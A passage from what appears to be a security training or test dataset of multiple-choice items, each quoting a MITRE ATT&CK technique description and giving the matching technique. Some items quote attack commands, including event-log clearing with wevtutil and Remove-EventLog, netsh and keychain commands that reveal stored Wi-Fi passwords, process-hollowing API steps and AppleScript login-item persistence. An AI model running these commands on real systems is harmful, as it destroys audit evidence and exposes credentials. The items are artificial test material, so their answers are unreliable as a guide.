    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.\nA. Email Collection: Email Forwarding Rule, B. Scheduled Task/Job, C. System Binary Proxy Execution: Compiled HTML File, D. Indicator Removal: Clear Windows Event Logs\nAnswer:",
    "context": "",
    "output": "D. Indicator Removal: Clear Windows Event Logs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
      "options": "A. Email Collection: Email Forwarding Rule, B. Scheduled Task/Job, C. System Binary Proxy Execution: Compiled HTML File, D. Indicator Removal: Clear Windows Event Logs",
      "choice": "D. Indicator Removal: Clear Windows Event Logs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.\nA. Steal or Forge Kerberos Tickets: Silver Ticket, B. Hijack Execution Flow: Services Registry Permissions Weakness, C. Remote Services: Remote Desktop Protocol, D. Web Service: Dead Drop Resolver",
    "context": "",
    "output": "A. Steal or Forge Kerberos Tickets: Silver Ticket",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
      "options": "A. Steal or Forge Kerberos Tickets: Silver Ticket, B. Hijack Execution Flow: Services Registry Permissions Weakness, C. Remote Services: Remote Desktop Protocol, D. Web Service: Dead Drop Resolver",
      "choice": "A. Steal or Forge Kerberos Tickets: Silver Ticket",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.\n\nPossible answers:\nA. Virtualization/Sandbox Evasion: Time Based Evasion, B. Masquerading: Masquerade File Type, C. System Binary Proxy Execution: Msiexec, D. Browser Extensions",
    "context": "",
    "output": "C. System Binary Proxy Execution: Msiexec",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.",
      "options": "A. Virtualization/Sandbox Evasion: Time Based Evasion, B. Masquerading: Masquerade File Type, C. System Binary Proxy Execution: Msiexec, D. Browser Extensions",
      "choice": "C. System Binary Proxy Execution: Msiexec",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries can the techniques as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment. If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.\nA. Defacement: Internal Defacement, B. Event Triggered Execution: Component Object Model Hijacking, C. Steal Application Access Token, D. Process Injection: Asynchronous Procedure Call",
    "context": "",
    "output": "C. Steal Application Access Token",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries can the techniques as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment. If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.",
      "options": "A. Defacement: Internal Defacement, B. Event Triggered Execution: Component Object Model Hijacking, C. Steal Application Access Token, D. Process Injection: Asynchronous Procedure Call",
      "choice": "C. Steal Application Access Token",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.\n\nOptions:\nA. Proxy, B. Phishing: Spearphishing Attachment, C. Defacement: External Defacement, D. Phishing for Information: Spearphishing Link",
    "context": "",
    "output": "D. Phishing for Information: Spearphishing Link",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "options": "A. Proxy, B. Phishing: Spearphishing Attachment, C. Defacement: External Defacement, D. Phishing for Information: Spearphishing Link",
      "choice": "D. Phishing for Information: Spearphishing Link",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. \n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.\n\nOptions:\nA. Escape to Host, B. Gather Victim Network Information: Network Trust Dependencies, C. Event Triggered Execution: Accessibility Features, D. Modify System Image: Downgrade System Image",
    "context": "",
    "output": "D. Modify System Image: Downgrade System Image",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. \n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.",
      "options": "A. Escape to Host, B. Gather Victim Network Information: Network Trust Dependencies, C. Event Triggered Execution: Accessibility Features, D. Modify System Image: Downgrade System Image",
      "choice": "D. Modify System Image: Downgrade System Image",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` Native API functions.\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`. On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).\n\nA. System Network Configuration Discovery: Wi-Fi Discovery, B. Obtain Capabilities: Artificial Intelligence, C. Process Injection: VDSO Hijacking, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\nA:",
    "context": "",
    "output": "A. System Network Configuration Discovery: Wi-Fi Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` Native API functions.\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`. On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).",
      "options": "A. System Network Configuration Discovery: Wi-Fi Discovery, B. Obtain Capabilities: Artificial Intelligence, C. Process Injection: VDSO Hijacking, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "choice": "A. System Network Configuration Discovery: Wi-Fi Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.\nA. Command and Scripting Interpreter: AutoHotKey & AutoIT, B. Obfuscated Files or Information, C. Process Injection: Process Hollowing, D. Compromise Accounts\nAnswer:",
    "context": "",
    "output": "C. Process Injection: Process Hollowing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Command and Scripting Interpreter: AutoHotKey & AutoIT, B. Obfuscated Files or Information, C. Process Injection: Process Hollowing, D. Compromise Accounts",
      "choice": "C. Process Injection: Process Hollowing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. \n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. \n\nDevices registered in Azure AD may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Azure AD tenant by registering a large number of devices.\n\nPossible answers:\nA. Compromise Host Software Binary, B. Gather Victim Org Information, C. Active Scanning, D. Account Manipulation: Device Registration",
    "context": "",
    "output": "D. Account Manipulation: Device Registration",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. \n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. \n\nDevices registered in Azure AD may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Azure AD tenant by registering a large number of devices.",
      "options": "A. Compromise Host Software Binary, B. Gather Victim Org Information, C. Active Scanning, D. Account Manipulation: Device Registration",
      "choice": "D. Account Manipulation: Device Registration",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>System.ComponentModel.RunInstaller(true)</code>.\n\nA. Pre-OS Boot, B. System Binary Proxy Execution: InstallUtil, C. Adversary-in-the-Middle, D. Software Discovery\nAnswer:",
    "context": "",
    "output": "B. System Binary Proxy Execution: InstallUtil",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>System.ComponentModel.RunInstaller(true)</code>.",
      "options": "A. Pre-OS Boot, B. System Binary Proxy Execution: InstallUtil, C. Adversary-in-the-Middle, D. Software Discovery",
      "choice": "B. System Binary Proxy Execution: InstallUtil",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>. This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.\nA. Boot or Logon Autostart Execution: Login Items, B. Cloud Storage Object Discovery, C. Pre-OS Boot: Bootkit, D. Dynamic Resolution: Fast Flux DNS\nAnswer:",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: Login Items",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>. This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.",
      "options": "A. Boot or Logon Autostart Execution: Login Items, B. Cloud Storage Object Discovery, C. Pre-OS Boot: Bootkit, D. Dynamic Resolution: Fast Flux DNS",
      "choice": "A. Boot or Logon Autostart Execution: Login Items",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.\nA. Indicator Removal: File Deletion, B. Container and Resource Discovery, C. Domain or Tenant Policy Modification, D. Hijack Execution Flow: Path Interception by Unquoted Path\nAnswer:",
    "context": "",
    "output": "B. Container and Resource Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
